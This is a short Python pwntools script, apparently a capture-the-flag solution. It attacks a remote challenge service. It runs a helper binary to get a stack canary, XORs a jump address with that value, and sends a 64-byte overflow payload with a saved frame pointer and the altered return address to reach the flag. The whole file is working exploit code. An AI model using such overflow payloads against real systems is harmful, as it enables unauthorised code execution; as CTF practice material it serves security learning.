from binascii import unhexlify
from pwn import *
import struct


def exploit(saved_ebp):

    jump_adress = "ce10400000000000"

    #p = process('./bin/step3')
    p = remote( "dumbistan.life", 50030)

    print p.recv()

    p.sendline('1')

    canary = subprocess.check_output(['./task3.out'])[2:-1]

    print "canary: >" + canary + "<"


    new_canary = ""
    for index in range(0, 8):
        offset = 14 - index * 2
        new_canary += canary[offset:(offset + 2)]
    canary = new_canary
    print "canary: >" + canary + "<"

    # perform xor
    binary_a = jump_adress.decode("hex")
    binary_b = canary.decode("hex")
    jump_adress = "".join(chr(ord(x) ^ ord(y)) for x, y in zip(binary_a, binary_b)).encode("hex")

    # print jump_adress

    sending = 64 * '\xff' + unhexlify(saved_ebp) + unhexlify(jump_adress)

    p.sendline(sending)
    p.sendline("password")

    print p.recv()

    p.sendline('2')

    p.sendline('9')

    while True:
        try:
            #time.sleep(1)
            recv = p.recv()
            print recv
            if ('flag{' in recv):
                break
            if ('OOPS' in recv):
                break

        except EOFError:
            print "----> Connection closed"
            break


saved_ebp = "a0e1ffffff7f0000"
exploit(saved_ebp)

